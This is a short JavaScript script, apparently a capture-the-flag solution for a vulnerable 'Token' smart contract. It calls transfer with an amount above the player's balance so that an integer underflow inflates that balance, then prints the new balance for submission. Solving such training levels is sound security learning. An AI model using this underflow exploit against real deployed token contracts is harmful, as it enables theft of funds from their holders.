const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

(async () => {
  try {
    const victim = loader.web3.fromArtifact('Token', instance)
    console.log('Hack contract by causing overflow...')
    await victim.methods.transfer(instance, 21).send()
    const balance = await victim.methods.balanceOf(web3.eth.defaultAccount).call()
    console.log('Done.', `Player's new balance is ${balance}`, 'You can submit your instance')
  } catch (err) {
    console.log(err.message)
  }
})()
